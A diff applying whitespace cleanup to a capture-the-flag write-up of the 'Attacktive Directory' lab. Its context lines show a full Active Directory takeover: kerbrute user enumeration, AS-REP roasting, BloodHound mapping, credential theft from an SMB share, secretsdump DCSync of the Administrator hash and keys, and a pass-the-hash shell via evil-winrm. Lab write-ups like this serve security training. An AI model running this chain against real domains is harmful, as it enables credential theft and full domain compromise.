@@ -14,7 +14,7 @@ PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
 |_http-title: IIS Windows Server
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-23 04:36:01Z)
@@ -32,7 +32,7 @@ PORT     STATE SERVICE       VERSION
 | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
 | Not valid before: 2026-02-22T04:31:29
 |_Not valid after:  2026-08-24T04:31:29
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: THM-AD
 |   NetBIOS_Domain_Name: THM-AD
 |   NetBIOS_Computer_Name: ATTACKTIVEDIREC
@@ -44,24 +44,24 @@ PORT     STATE SERVICE       VERSION
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
-                                                                                                                                                             
-Host script results:                                                                                                                                         
-| smb2-time:                                                                                                                                                 
-|   date: 2026-02-23T04:36:07                                                                                                                                
-|_  start_date: N/A                                                                                                                                          
-|_clock-skew: mean: 1s, deviation: 0s, median: 0s                                                                                                            
-| smb2-security-mode:                                                                                                                                        
-|   3.1.1:                                                                                                                                                   
-|_    Message signing enabled and required                                                                                                                   
-                                                                                                                                                             
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                               
+
+Host script results:
+| smb2-time:
+|   date: 2026-02-23T04:36:07
+|_  start_date: N/A
+|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.91 seconds
 ```
 
 We have a basic AD services running. Let's update our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                                           
+kali@kali:cat /etc/hosts
 10.49.157.22    AttacktiveDirectory.spookysec.local spookysec.local
 
 127.0.0.1       localhost
@@ -90,13 +90,13 @@ Unable to connect with SMB1 -- no workgroup available
 It seems as a guest user, we have no shares listing allowed. Let's use kerbrute to find the usernames using the wordlist provided to us.
 
 ```bash
-kali@kali:kerbrute userenum -d spookysec.local --dc 10.49.157.22 users.txt                                                                                         
+kali@kali:kerbrute userenum -d spookysec.local --dc 10.49.157.22 users.txt
 
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
 Version: v1.0.3 (9dad6e1) - 02/23/26 - Ronnie Flathers @ropnop
 
@@ -127,8 +127,8 @@ From here, svc-admin and backup are worth noting, as they are generally high-val
 Let's ask for AS-REP hash for svc-admin.
 
 ```bash
-kali@kali:impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.49.157.22 -no-pass                                                                               
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.49.157.22 -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1f4646d.....b64d10
@@ -162,7 +162,7 @@ kali@kali:xfreerdp3 /u:svc-admin /p:ma...05 /v:10.49.157.22 /d:spookysec.local /
 We have our first flag. Since, we have a valid set of credentials, we can use bloodhound to map out entire AD, so that we can forge our attack path.
 
 ```bash
-kali@kali:bloodhound-python -u 'svc-admin' -p 'ma...05' -d spookysec.local -ns 10.49.157.22 -c All                                                          
+kali@kali:bloodhound-python -u 'svc-admin' -p 'ma...05' -d spookysec.local -ns 10.49.157.22 -c All
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: spookysec.local
 INFO: Getting TGT for user
@@ -232,7 +232,7 @@ Unable to connect with SMB1 -- no workgroup available
 We now have a shares. The backup share seems interesting.
 
 ```bash
-kali@kali:smbclient //10.49.157.22/backup -U 'spookysec.local\svc-admin%ma...05'                                                                            
+kali@kali:smbclient //10.49.157.22/backup -U 'spookysec.local\svc-admin%ma...05'
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Sun Apr  5 00:53:39 2020
@@ -240,15 +240,15 @@ smb: \> ls
   backup_credentials.txt              A       48  Sun Apr  5 00:53:53 2020
 
                 8247551 blocks of size 4096. 3590849 blocks available
-smb: \> get backup_credentials.txt 
+smb: \> get backup_credentials.txt
 getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
-smb: \> 
+smb: \>
 ```
 
 We have backup credentials. Let's see what it has for us.
 
 ```bash
-kali@kali:cat backup_credentials.txt                                                                                                                               
+kali@kali:cat backup_credentials.txt
 YmFj.....ODYw
 ```
 ```
@@ -274,8 +274,8 @@ Now, that is done. Let's get back to bloodhound to see what this user can do.
 This user has GenericAll on domain admin. We can simply get the Admin hash using impacket-secretsdump.
 
 ```bash
-kali@kali:impacket-secretsdump spookysec.local/backup:'ba...60'@10.49.157.22 -just-dc-user Administrator                                                     
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-secretsdump spookysec.local/backup:'ba...60'@10.49.157.22 -just-dc-user Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -284,20 +284,20 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e.....fc:::
 Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
 Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
 Administrator:des-cbc-md5:2079ce0e5df189ad
-[*] Cleaning up... 
+[*] Cleaning up...
 ```
 
 Now, we have let's login via evil-winrm.
 
 ```bash
-kali@kali:evil-winrm -i 10.49.157.22 -u Administrator -H 0e.....fc                                                                          
-                                        
+kali@kali:evil-winrm -i 10.49.157.22 -u Administrator -H 0e.....fc
+
 Evil-WinRM shell v3.9
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 thm-ad\administrator
